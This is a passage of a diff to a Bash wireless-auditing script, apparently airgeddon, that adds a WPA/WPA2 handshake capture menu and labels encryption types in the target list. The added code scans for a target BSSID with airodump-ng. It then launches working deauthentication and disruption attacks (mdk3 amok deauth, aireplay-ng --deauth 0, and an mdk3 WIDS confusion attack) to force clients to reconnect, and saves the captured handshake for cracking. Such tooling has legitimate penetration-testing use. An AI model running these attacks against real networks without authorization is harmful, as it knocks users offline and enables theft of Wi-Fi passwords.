-			explore_neighbourhood_option
+			explore_for_targets_option
 		;;
 		5)
 			mdk3_deauth_option
@@ -1326,7 +1710,194 @@ function dos_attacks_menu() {
 	dos_attacks_menu
 }
 
-function explore_neighbourhood_option() {
+function capture_handshake() {
+
+	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "$essid" = "(Hidden Network)" ]]; then
+		echo
+		language_strings ${language} 125 "yellow"
+		language_strings ${language} 115 "read"
+		explore_for_targets_option
+	fi
+
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
+		echo
+		language_strings ${language} 137 "yellow"
+		language_strings ${language} 115 "read"
+		return 1
+	fi
+
+	language_strings ${language} 126 "yellow"
+	language_strings ${language} 115 "read"
+
+	attack_handshake_menu "new"
+}
+
+function check_file_exists() {
+
+	if [ ! -f $1 ]; then
+		language_strings ${language} 161 "yellow"
+		return 1
+	fi
+	return 0
+}
+
+function validate_path() {
+
+	dirname=${1%/*}
+
+	if [[ ! -d ${dirname} ]] || [[ "$dirname" = "." ]]; then
+		language_strings ${language} 156 "yellow"
+		return 1
+	fi
+
+	check_write_permissions ${dirname}
+	if [ "$?" != "0" ]; then
+		language_strings ${language} 157 "yellow"
+		return 1
+	fi
+
+	lastcharmanualpath=${1: -1}
+	if [ "$lastcharmanualpath" = "/" ]; then
+		enteredpath="$1$standardhandshake_filename"
+		language_strings ${language} 155 "yellow"
+		return 0
+	fi
+
+	language_strings ${language} 158 "yellow"
+	return 0
+}
+
+function check_write_permissions() {
+
+	if [ -w ${1} ]; then
+		return 0
+	fi
+	return 1
+}
+
+function read_path() {
+
+	echo
+	case ${1} in
+		"handshake")
+			language_strings ${language} 148 "green"
+			read enteredpath
+			if [ -z "$enteredpath" ]; then
+				enteredpath=${handshakepath}
+			fi
+			validate_path ${enteredpath}
+		;;
+		"cleanhandshake")
+			language_strings ${language} 154 "green"
+			read filetoclean
+			check_file_exists ${filetoclean}
+		;;
+	esac
+
+	validpath="$?"
+	return ${validpath}
+}
+
+function attack_handshake_menu() {
+
+	if [ "$1" = "handshake" ]; then
+		ask_yesno 145
+		handshake_captured=${yesno}
+		kill ${processidcapture} &> /dev/null
+		if [ "$handshake_captured" = "y" ]; then
+
+			handshakepath=`env | grep ^HOME | awk -F = '{print $2}'`
+			lastcharhandshakepath=${handshakepath: -1}
+			if [ "$lastcharhandshakepath" != "/" ]; then
+				handshakepath="$handshakepath/"
+			fi
+			handshakefilename="handshake-$bssid.cap"
+			handshakepath="$handshakepath$handshakefilename"
+
+			language_strings ${language} 162 "yellow"
+			validpath=1
+			while [[ "$validpath" != "0" ]]; do
+				read_path "handshake"
+			done
+
+			cp "/tmp/$standardhandshake_filename" ${enteredpath}
+			echo
+			language_strings ${language} 149 "yellow"
+			language_strings ${language} 115 "read"
+			return
+		else
+			echo
+			language_strings ${language} 146 "yellow"
+			language_strings ${language} 115 "read"
+		fi
+	fi
+
+	clear
+	language_strings ${language} 138 "titlered"
+	current_menu="attack_handshake_menu"
+	print_selections
+	echo
+	language_strings ${language} 47 "green"
+	echo_blue "---------"
+	language_strings ${language} 139
+	language_strings ${language} 140
+	language_strings ${language} 141
+	echo_blue "---------"
+	language_strings ${language} 147
+	print_hint ${current_menu}
+
+	read attack_handshake_option
+	case ${attack_handshake_option} in
+		1)
+			capture_handshake_window
+			rm -rf /tmp/bl.txt > /dev/null 2>&1
+			echo ${bssid} > /tmp/bl.txt
+			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "mdk3 amok attack" -e mdk3 ${interface} d -b /tmp/bl.txt -c ${channel} &
+			sleeptimeattack=12
+		;;
+		2)
+			capture_handshake_window
+			${airmon} start ${interface} ${channel} > /dev/null 2>&1
+			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} &
+			sleeptimeattack=12
+		;;
+		3)
+			capture_handshake_window
+			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} &
+			sleeptimeattack=16
+		;;
+		4)
+			return
+		;;
+		*)
+			invalid_menu_option
+			attack_handshake_menu "new"
+		;;
+	esac
+
+	processidattack=$!
+	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+
+	attack_handshake_menu "handshake"
+}
+
+function capture_handshake_window() {
+
+	language_strings ${language} 143 "yellow"
+	echo
+	language_strings ${language} 144 "yellow"
+	language_strings ${language} 115 "read"
+
+	rm -rf /tmp/handshake* > /dev/null 2>&1
+	xterm +j -sb -rightbar -geometry 119x20+1000+10 -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w /tmp/handshake ${interface} &
+	processidcapture=$!
+}
+
+function explore_for_targets_option() {
 
 	echo
 	language_strings ${language} 103 "titlered"
@@ -1334,7 +1905,7 @@ function explore_neighbourhood_option() {
 
 	check_monitor_enabled
 	if [ "$?" != "0" ]; then
-		return
+		return 1
 	fi
 
 	echo
@@ -1345,14 +1916,14 @@ function explore_neighbourhood_option() {
 
 	rm -rf /tmp/nws* > /dev/null 2>&1
 	rm -rf /tmp/clts.csv > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring neighbourhood" -e airodump-ng -w /tmp/nws ${interface}
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring for targets" -e airodump-ng -w /tmp/nws ${interface}
 	targetline=`cat /tmp/nws-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	targetline=`expr ${targetline} - 1`
 
 	head -n ${targetline} /tmp/nws-01.csv &> /tmp/nws.csv
 	tail -n +${targetline} /tmp/nws-01.csv &> /tmp/clts.csv
 
-	csvline=`wc -l /tmp/nws.csv | awk '{print $1}'`
+	csvline=`wc -l /tmp/nws.csv 2> /dev/null | awk '{print $1}'`
 	if [ ${csvline} -le 3 ]; then
 		echo
 		language_strings ${language} 68 "yellow"
@@ -1363,7 +1934,7 @@ function explore_neighbourhood_option() {
 	rm -rf /tmp/nws.txt > /dev/null 2>&1
 	rm -rf /tmp/wnws.txt > /dev/null 2>&1
 	i=0
-	while IFS=, read exp_mac exp_fts exp_lts exp_channel exp_speed exp_privacy exp_cypher exp_auth exp_power exp_beacon exp_iv exp_lanip exp_idlength exp_essid exp_key; do
+	while IFS=, read exp_mac exp_fts exp_lts exp_channel exp_speed exp_enc exp_cypher exp_auth exp_power exp_beacon exp_iv exp_lanip exp_idlength exp_essid exp_key; do
 
 		chars_mac=${#exp_mac}
 		if [ ${chars_mac} -ge 17 ]; then
@@ -1387,7 +1958,10 @@ function explore_neighbourhood_option() {
 			if [ "$exp_essid" = "" ] || [ "$exp_channel" = "-1" ]; then
 				exp_essid="(Hidden Network)"
 			fi
-			echo -e "$exp_mac,$exp_channel,$exp_power,$exp_essid" >> /tmp/nws.txt
+
+			exp_enc=`echo ${exp_enc} | awk '{print $1}'`
+
+			echo -e "$exp_mac,$exp_channel,$exp_power,$exp_essid,$exp_enc" >> /tmp/nws.txt
 		fi
 	done < /tmp/nws.csv
 	sort -t "," -d -k 4 "/tmp/nws.txt" > "/tmp/wnws.txt"
@@ -1401,7 +1975,7 @@ function select_target() {
 	language_strings ${language} 69 "green"
 	echo_blue "-------------------------------------------------------"
 	i=0
-	while IFS=, read exp_mac exp_channel exp_power exp_essid; do
+	while IFS=, read exp_mac exp_channel exp_power exp_essid exp_enc; do
 
 		i=$(($i+1))
 
@@ -1438,10 +2012,20 @@ function select_target() {
 			sp5=" "
 		fi
 
+		enc_length=${#exp_enc}
+		if [ ${enc_length} -gt 3 ]; then
+			sp6=""
+		elif [ ${enc_length} -eq 0 ]; then
+			sp6="    "
+		else
+			sp6=" "
+		fi
+
 		network_names[$i]=${exp_essid}
 		channels[$i]=${exp_channel}
 		macs[$i]=${exp_mac}
-		echo -e " $sp1$i)$client  $sp5$exp_mac   $sp2$exp_channel    $sp4$exp_power%   $exp_essid"
+		encs[$i]=${exp_enc}
+		echo -e " $sp1$i)$client  $sp5$exp_mac   $sp2$exp_channel    $sp4$exp_power%   $exp_enc$sp6   $exp_essid"
 	done < "/tmp/wnws.txt"
 	echo
 	if [ ${i} -eq 1 ]; then
@@ -1466,6 +2050,7 @@ function select_target() {
 	essid=${network_names[$selected_target_network]}
 	channel=${channels[$selected_target_network]}
 	bssid=${macs[$selected_target_network]}
+	enc=${encs[$selected_target_network]}
 }
 
 function credits_option() {
@@ -1540,8 +2125,10 @@ function killing_script() {
 			dos_attacks_menu
 		;;
 		"handshake_tools_menu")
-			#Under construction
-			#handshake_tools_menu
+			handshake_tools_menu
+		;;
+		"attack_handshake_menu")
+			attack_handshake_menu "new"
 		;;
 		*)
 			main_menu
@@ -1666,7 +2253,6 @@ function welcome() {
 
 	clear
 	current_menu="main"
-
 	autodetect_language
 
 	language_strings ${language} 86 "titlered"
